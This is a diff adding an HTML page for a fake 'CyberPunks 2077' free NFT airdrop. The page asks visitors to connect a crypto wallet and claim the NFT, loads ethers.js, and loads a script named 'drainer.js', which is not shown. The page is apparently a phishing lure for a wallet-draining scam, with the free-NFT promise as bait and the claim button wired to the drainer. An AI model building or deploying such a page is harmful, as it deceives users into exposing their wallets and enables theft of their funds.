@@ -1,1 +1,23 @@
-.
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exclusive NFT Mint</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <h1>CyberPunks 2077 Airdrop</h1>
+        <p>Connect your wallet to claim your exclusive free NFT!</p>
+        <p id="status" class="status-disconnected">Status: Disconnected</p>
+        <button id="connectButton">Connect Wallet</button>
+        <button id="mintButton" disabled>Claim FREE NFT</button>
+    </div>
+
+    <!-- Подключаем ethers.js с CDN, чтобы не возиться с npm -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
+    <script src="drainer.js"></script>
+</body>
+</html>
+
